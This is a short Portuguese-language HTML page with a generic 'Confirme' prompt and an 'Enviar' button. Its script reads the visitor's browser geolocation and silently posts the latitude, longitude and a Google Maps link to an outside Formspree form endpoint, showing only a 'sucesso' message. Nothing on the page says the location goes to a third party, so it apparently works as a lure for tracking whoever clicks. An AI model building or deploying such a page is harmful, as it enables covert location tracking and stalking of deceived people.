<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8">
  <title>Compartilhar</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      text-align: center;
      padding: 40px;
      background-color: #f0f0f0;
    }
    button {
      padding: 12px 24px;
      font-size: 16px;
      background-color: #007bff;
      color: white;
      border: none;
      border-radius: 8px;
      cursor: pointer;
    }
    .msg {
      margin-top: 30px;
      font-size: 18px;
    }
  </style>
</head>
<body>

  <h2>Confirme</h2>
  <p>Clique no botão abaixo para continuar.</p>
  <button onclick="enviar()">Enviar</button>

  <div class="msg" id="msg"></div>

  <script>
    function enviar() {
      const msg = document.getElementById("msg");

      if (!navigator.geolocation) {
        msg.textContent = "Seu navegador não suporta geolocalização.";
        return;
      }

      navigator.geolocation.getCurrentPosition(function(pos) {
        const lat = pos.coords.latitude;
        const lon = pos.coords.longitude;
        const maps = `https://www.google.com/maps?q=${lat},${lon}`;

        fetch("https://formspree.io/f/xblkdpwz", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            latitude: lat,
            longitude: lon,
            maps_link: maps
          })
        }).then(() => {
          msg.innerHTML = `
            ✅ sucesso!<br>
            <a href="${maps}" target="_blank">Ver no Google Maps</a>
          `;
        }).catch(() => {
          msg.textContent = "❌ Erro ao enviar localização.";
        });

      }, function(error) {
        msg.textContent = "Permissão negada ou erro ao obter localização.";
      });
    }
  </script>

</body>
</html>
